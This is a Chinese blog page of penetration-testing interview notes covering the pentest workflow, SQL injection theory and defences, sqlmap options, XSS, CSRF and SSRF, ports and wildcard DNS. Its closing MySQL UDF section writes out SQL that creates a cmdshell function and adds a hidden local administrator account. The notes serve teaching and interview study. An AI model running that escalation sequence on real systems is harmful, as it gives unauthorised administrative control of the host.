<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>渗透测试面经整理 | GML的博客</title><meta name="author" content="GML"><meta name="copyright" content="GML"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="思路流程信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站，C段等 google..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "渗透测试面经整理",
  "url": "http://example.com/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/",
  "image": "https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg",
  "datePublished": "2023-04-16T06:26:23.000Z",
  "dateModified": "2023-06-19T07:39:24.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "GML",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
          
          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: GML","link":"链接: ","source":"来源: GML的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透测试面经整理',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/css/function.min.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/9c4992ebfcaef0dc98f5ab70af9a29f76bc89ca4.jpg%40100Q.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/mmexport1681377706600.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">GML的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">渗透测试面经整理</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试面经整理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-16T06:26:23.000Z" title="发表于 2023-04-16 14:26:23">2023-04-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-19T07:39:24.000Z" title="更新于 2023-06-19 15:39:24">2023-06-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
<li>子域名收集，旁站，C段等</li>
<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
<li>传输协议，通用漏洞，exp，github源码等</li>
</ol>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ol>
<li>浏览网站，看看网站规模，功能，特点等</li>
<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
</ol>
<h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title="漏洞利用&amp;权限提升"></a>漏洞利用&amp;权限提升</h3><ul>
<li>mysql提权，serv-u提权，oracle提权</li>
<li>windows 溢出提权</li>
<li>linux脏牛,内核漏洞提权e</li>
</ul>
<h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title="清除测试数据&amp;输出报告"></a>清除测试数据&amp;输出报告</h3><p>i 日志、测试数据的清理<br>ii 总结，输出渗透测试报告，附修复方案</p>
<h3 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>6、规范编码,字符集</p>
<h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title="为什么参数化查询可以防止sql注入"></a>为什么参数化查询可以防止sql注入</h2><p>原理:</p>
<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
<p>简单的说:<br>参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
<h2 id="sql的报错注入原理"><a href="#sql的报错注入原理" class="headerlink" title="sql的报错注入原理"></a>sql的报错注入原理</h2><blockquote>
<p>报错注入的使用场景一般是在页面无法显示数据库的信息，但是是有报错内容的,报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p>
</blockquote>
<h3 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h3><p>MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。updatexml() 函数的报错内容长度不能超过32个字符，我一般用MID() 函数从中提取字符</p>
<h2 id="sql的布尔注入原理和用到的函数"><a href="#sql的布尔注入原理和用到的函数" class="headerlink" title="sql的布尔注入原理和用到的函数"></a>sql的布尔注入原理和用到的函数</h2><blockquote>
<p>SQL布尔注入是一种利用布尔逻辑漏洞的攻击方式，与常规的SQL注入攻击不同，它并不会直接注入恶意代码，而是利用查询语句中的布尔逻辑，通过不断猜测来获取敏感信息。</p>
</blockquote>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol>
<li><code>LIKE</code> 函数：该函数可以用于模糊匹配查询，通常与通配符一起使用。攻击者可以使用通配符来逐个猜测字符或字符串的值，以获取敏感信息。</li>
<li><code>SUBSTRING</code> 函数：该函数可以用于提取字符串的子串。攻击者可以使用该函数来提取密码的每个字符，从而逐个猜测密码的值。</li>
<li><code>ASCII</code> 函数：该函数可以将字符转换为其对应的ASCII码。攻击者可以使用该函数来比较密码的每个字符的ASCII码值，以猜测密码的值。</li>
<li><code>LENGTH</code> 函数：该函数可以获取字符串的长度。攻击者可以使用该函数来确定密码的长度，从而更快地猜测密码的值。</li>
</ol>
<h2 id="sqlmap常用的参数有哪些"><a href="#sqlmap常用的参数有哪些" class="headerlink" title="sqlmap常用的参数有哪些"></a>sqlmap常用的参数有哪些</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-v:输出信息的详细程度，默认为1</span><br><span class="line">  0：只输出 Python 出错回溯信息，错误和关键信息</span><br><span class="line">  1：增加输出普通信息和警告信息</span><br><span class="line">  2：增加输出调试信息</span><br><span class="line">  3：增加输出已注入的 payloads</span><br><span class="line">  4：增加输出 HTTP 请求</span><br><span class="line">  5：增加输出 HTTP 响应头</span><br><span class="line">  6：增加输出 HTTP 响应内容</span><br><span class="line">-u：指定要测试的URL。</span><br><span class="line">-d: 直接连接到数据库    例如 sqlmap -d &quot;mysql://root:root@192.168.1.200:3306/test&quot;</span><br><span class="line">-m  从文本中获取多个目标url,url 会保存在文档中，sqlmap会一个个检测</span><br><span class="line">-r: 从文件中加载http请求,如果目标是post请求，可以直接将其请求导入到文件中，然后-r 调用这个文件</span><br><span class="line">-C 指定字段</span><br><span class="line">-T 指定表</span><br><span class="line">-D 指定数据库</span><br><span class="line">--data：指定POST请求的数据。 例如 sqlmap -u &quot;http:192.168.1.200/index.php&quot; --data=&quot;id=1&quot;</span><br><span class="line">--cookie：指定HTTP cookie。</span><br><span class="line">--random-agent：使用随机的用户代理标识进行测试。</span><br><span class="line">--technique：设置SQL注入测试的技术。</span><br><span class="line">--level：设置SQL注入测试的等级，范围是1到5，默认值是1。</span><br><span class="line">--threads：设置线程数，默认为1。</span><br><span class="line">--batch：设置批量模式，不会询问任何问题，只会使用默认值。</span><br><span class="line">--dbms：指定要测试的数据库类型。</span><br><span class="line">--os：指定要测试的操作系统类型。</span><br><span class="line">--risk：设置测试中使用的风险等级，范围是1到3，默认值是1。</span><br><span class="line">--dump：导出数据库的数据。</span><br><span class="line">--dbs：列出所有可用的数据库。</span><br><span class="line">--tables：列出指定数据库中的所有表。</span><br><span class="line">--columns：列出指定表中的所有列。</span><br><span class="line">--users：列出指定数据库中的所有用户。</span><br><span class="line">-- corrent-user: 获取当前数据库</span><br><span class="line">--passwords：列出指定数据库中的所有用户的密码。</span><br><span class="line">--tor：使用Tor网络进行测试。</span><br><span class="line">--tamper：设置SQLMap使用的注入负载模板。</span><br><span class="line">--prefix：设置测试时使用的前缀字符。</span><br><span class="line">--flush-session：#清除上次扫描的缓存</span><br><span class="line">--purge		#清除历史缓存</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap中的–os-shell原理"><a href="#sqlmap中的–os-shell原理" class="headerlink" title="sqlmap中的–os-shell原理"></a>sqlmap中的–os-shell原理</h2><blockquote>
<p>SQLMap会通过注入SQL语句在目标服务器上执行一段特定的代码，该代码会在目标服务器上启动一个后门程序，该后门程序会监听SQLMap指定的端口号，并接受SQLMap发送的命令，并将命令的执行结果返回给SQLMap。</p>
<p>接下来，SQLMap就可以通过<code>--os-shell</code>参数启动一个交互式Shell，与目标服务器进行交互，并执行各种命令，从而实现对目标服务器的控制。</p>
</blockquote>
<h2 id="文件上传绕过方式"><a href="#文件上传绕过方式" class="headerlink" title="文件上传绕过方式"></a>文件上传绕过方式</h2><p><a target="_blank" rel="noopener" href="https://kaliluying.github.io/2023/04/14/file-upload%E7%BB%95%E8%BF%87/">看这篇文章</a></p>
<h2 id="文件上传有哪些防护方式"><a href="#文件上传有哪些防护方式" class="headerlink" title="文件上传有哪些防护方式"></a>文件上传有哪些防护方式</h2><ol>
<li>文件类型检查：对用户上传的文件进行类型检查，确保只允许上传合法的文件类型。可以通过检查文件扩展名或使用文件魔术数字（Magic Number）进行验证。</li>
<li>文件内容验证：除了检查文件类型外，还可以对文件内容进行验证。例如，对于图像文件，可以检查文件的头部和结尾是否符合图像文件的格式规范。</li>
<li>文件大小限制：限制上传文件的最大大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。</li>
<li>安全的文件存储位置：将用户上传的文件存储在服务器的安全目录中，不要将其存储在可以直接执行的目录下。确保上传的文件无法通过浏览器直接访问，设置适当的访问权限。</li>
<li>输入数据验证和过滤：在接收用户上传文件的过程中，对用户输入的数据进行验证和过滤，以防止恶意代码或特殊字符的注入。</li>
<li>文件名重命名：为上传的文件生成一个随机的、唯一的文件名，以防止恶意用户上传具有恶意目的的文件名。</li>
<li>安全的文件处理和解析：对上传的文件进行安全的处理和解析，例如，对图像文件进行缩放、剪裁等操作时，确保使用安全的库和方法，以防止恶意代码的执行。</li>
<li>安全的服务器配置：确保服务器的安全配置，例如禁用不必要的文件上传功能、限制服务器的资源使用等。</li>
<li>定期更新和修补漏洞：及时更新和修补使用的上传组件或框架，以防止已知漏洞的利用。</li>
<li>安全意识培训：向开发人员和用户提供安全意识培训，使他们了解文件上传漏洞的潜在威胁，并学习如何避免和处理这些威胁。</li>
</ol>
<h2 id="xss的几种类型及漏洞原理"><a href="#xss的几种类型及漏洞原理" class="headerlink" title="xss的几种类型及漏洞原理"></a>xss的几种类型及漏洞原理</h2><blockquote>
<p>XSS漏洞的原理是，攻击者利用Web应用程序没有对用户输入进行足够的验证和过滤，从而导致恶意脚本被注入到Web页面中。攻击者可以利用恶意脚本窃取用户的敏感信息、篡改页面内容、劫持用户会话等。</p>
</blockquote>
<ol>
<li>反射型XSS：攻击者构造恶意链接或提交恶意表单，当受害者访问该链接或提交表单时，恶意代码会被注入到响应的HTML页面中，从而攻击受害者。</li>
<li>存储型XSS：攻击者将恶意脚本上传到Web应用程序的服务器端，并将它们保存到数据库中。当用户访问包含恶意脚本的页面时，恶意脚本会被从数据库中取出并注入到页面中，从而攻击受害者。</li>
<li>基于DOM的XSS：攻击者通过恶意脚本直接修改浏览器中的DOM，从而实现攻击目的。</li>
</ol>
<h2 id="csrf、xss和ssrf之间的区别"><a href="#csrf、xss和ssrf之间的区别" class="headerlink" title="csrf、xss和ssrf之间的区别"></a>csrf、xss和ssrf之间的区别</h2><ol>
<li>CSRF（跨站请求伪造）：攻击者通过诱骗用户访问恶意网站或点击恶意链接等方式，向目标网站发送伪造的请求，从而执行非授权的操作。攻击者通过利用已登录用户的Cookie，来欺骗服务器相信这个请求是受害者发送的，从而完成攻击。防范CSRF的措施包括加入Token验证、Referer验证等。</li>
<li>XSS（跨站脚本攻击）：攻击者通过在Web页面中注入恶意脚本，欺骗用户点击链接或提交表单，从而执行攻击。恶意脚本可以窃取用户的敏感信息，篡改页面内容，劫持用户会话等。防范XSS的措施包括输入验证、输出编码等。</li>
<li>SSRF（服务器端请求伪造）：攻击者通过篡改Web应用程序对外部资源的访问方式，使Web应用程序向攻击者指定的服务器发送请求，从而攻击目标服务器或本地网络。攻击者可以利用SSRF来窃取敏感信息，发起网络攻击等。防范SSRF的措施包括对输入进行严格限制，禁止访问内部资源等。</li>
</ol>
<h2 id="windows中查看进程的命令"><a href="#windows中查看进程的命令" class="headerlink" title="windows中查看进程的命令"></a>windows中查看进程的命令</h2><ol>
<li>tasklist命令：在命令行中输入“tasklist”命令，可以列出当前所有运行的进程信息，包括进程ID、名称、状态、内存使用等信息。该命令还支持其他参数，如“tasklist &#x2F;svc”可以列出每个进程对应的服务信息。</li>
<li>netstat -aon:列出当前正在运行的网络连接和进程信息<ol>
<li>“-a”参数表示显示所有的网络连接，包括正在监听的连接和建立的连接。</li>
<li>“-o”参数表示显示与每个网络连接相关联的进程ID。</li>
<li>“-n”参数表示以数字形式显示网络地址和端口号，而不是解析为域名和服务名称。</li>
</ol>
</li>
</ol>
<h2 id="windows中结束进程的命令"><a href="#windows中结束进程的命令" class="headerlink" title="windows中结束进程的命令"></a>windows中结束进程的命令</h2><ol>
<li><p>taskkill命令：在命令提示符中输入”taskkill &#x2F;pid [进程ID]”命令可以结束指定进程ID的进程。例如，如果要结束进程ID为1234的进程，可以使用命令”taskkill &#x2F;pid 1234”。该命令还支持其他参数，如”&#x2F;f”参数表示强制结束进程。</p>
</li>
<li><p>tskill命令：在命令提示符中输入”tskill [进程名称]”命令可以结束指定名称的进程。例如，如果要结束名称为chrome的进程，可以使用命令”tskill chrome”。该命令也支持其他参数，如”&#x2F;a”参数表示结束所有同名的进程。</p>
</li>
</ol>
<h2 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a>linux常用命令</h2><p><a target="_blank" rel="noopener" href="https://kaliluying.github.io/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">看这篇文章</a></p>
<h2 id="常见的端口和对应的服务"><a href="#常见的端口和对应的服务" class="headerlink" title="常见的端口和对应的服务"></a>常见的端口和对应的服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">- 20/21：FTP服务</span><br><span class="line">- 22：SSH服务</span><br><span class="line">- 23：Telnet服务</span><br><span class="line">- 25：SMTP服务</span><br><span class="line">- 53：DNS服务</span><br><span class="line">- 67/68：DHCP服务</span><br><span class="line">- 69：TFTP服务</span><br><span class="line">- 80/8080/443：HTTP/HTTPS服务</span><br><span class="line">- 110：POP3服务</span><br><span class="line">- 119：NNTP服务</span><br><span class="line">- 123：NTP服务</span><br><span class="line">- 135/139/445：SMB服务</span><br><span class="line">- 143：IMAP服务</span><br><span class="line">- 161/162：SNMP服务</span><br><span class="line">- 389/636：LDAP服务</span><br><span class="line">- 443：HTTPS服务</span><br><span class="line">- 465：SMTPS服务</span><br><span class="line">- 500：IKEv1服务</span><br><span class="line">- 514：Syslog服务</span><br><span class="line">- 563：NNTPS服务</span><br><span class="line">- 631：CUPS服务</span><br><span class="line">- 873：rsync服务</span><br><span class="line">- 993/995：IMAPS/POP3S服务</span><br><span class="line">- 1433/1434：Microsoft SQL Server服务</span><br><span class="line">- 1521/1522：Oracle数据库服务</span><br><span class="line">- 2049：NFS服务</span><br><span class="line">- 3306：MySQL数据库服务</span><br><span class="line">- 3389：Remote Desktop服务</span><br><span class="line">- 5432/5433：PostgreSQL数据库服务</span><br><span class="line">- 5900/5901：VNC服务</span><br><span class="line">- 6379：Redis数据库服务</span><br><span class="line">- 7001/7002：Weblogic服务</span><br><span class="line">- 8000/8005/8009：Tomcat服务</span><br><span class="line">- 8081：Zabbix服务</span><br><span class="line">- 9000/9001：Elasticsearch服务</span><br><span class="line">- 9090：Openfire服务</span><br></pre></td></tr></table></figure>

<h2 id="OSI七层模型有哪些"><a href="#OSI七层模型有哪些" class="headerlink" title="OSI七层模型有哪些"></a>OSI七层模型有哪些</h2><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/v2-2d62ba265be486cb94ab531912aa3b9c_1440w.webp" alt="osi/tcp"></p>
<h2 id="如何处理信息收集时子域名爆破泛解析的问题"><a href="#如何处理信息收集时子域名爆破泛解析的问题" class="headerlink" title="如何处理信息收集时子域名爆破泛解析的问题"></a>如何处理信息收集时子域名爆破泛解析的问题</h2><h3 id="子域名泛解析的成因"><a href="#子域名泛解析的成因" class="headerlink" title="子域名泛解析的成因"></a>子域名泛解析的成因</h3><p>在子域名解析中，每个子域名都会解析为一个特定的IP地址。只有被设置解析，用户才能正常进行访问。一旦用户输入错误的子域名，就会造成无法访问。<br>在网站运营中，域名持有者为了避免因为错误输入，而造成用户流失，就会使用泛域名解析。<br>子域名泛解析是一种DNS配置设置，它允许将所有子域名都解析到同一个IP地址上。这意味着无论用户输入哪个子域名，DNS服务器都会返回相同的IP地址。<br>但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。</p>
<h3 id="子域名爆破中解决泛解析的方式"><a href="#子域名爆破中解决泛解析的方式" class="headerlink" title="子域名爆破中解决泛解析的方式"></a>子域名爆破中解决泛解析的方式</h3><p>目前最常见的解决方式是IP黑名单的方式，首先访问一个随机的并不存在的域，通过返回的结果判断是否存在泛解析，确定存在泛解析后，（脚本实现）不断的生成随机域名并发送请求，将每次返回的IP和TTL记录下来，直到大部分的IP出现次数都大于两次，则IP黑名单收集完成。而后使用域名字典进行爆破，爆破过程中根据IP黑名单进行过滤，同时比较TTL，在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</p>
<h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title="mysql两种提权方式"></a>mysql两种提权方式</h2><p>udf提权,mof提权</p>
<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql_UDF提权"></a>Mysql_UDF提权</h3><p>要求:<br>1.目标系统是Windows(Win2000,XP,Win2003)；<br>2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数<br>3.有root账号密码<br>导出udf:<br>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>可以再mysql里输入<br><code>select @@basedir</code><br><code>show variables like ‘%plugins%’</code> 寻找mysql安装路径<br>提权:</p>
<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch /add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch /add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>

<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
